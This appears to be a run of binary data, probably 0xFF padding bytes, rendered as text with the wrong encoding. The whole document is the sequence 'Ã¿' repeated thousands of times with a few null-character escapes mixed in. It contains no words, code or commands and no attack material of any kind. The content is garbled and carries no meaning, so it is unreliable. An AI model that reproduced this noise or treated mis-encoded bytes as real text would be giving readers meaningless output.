Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã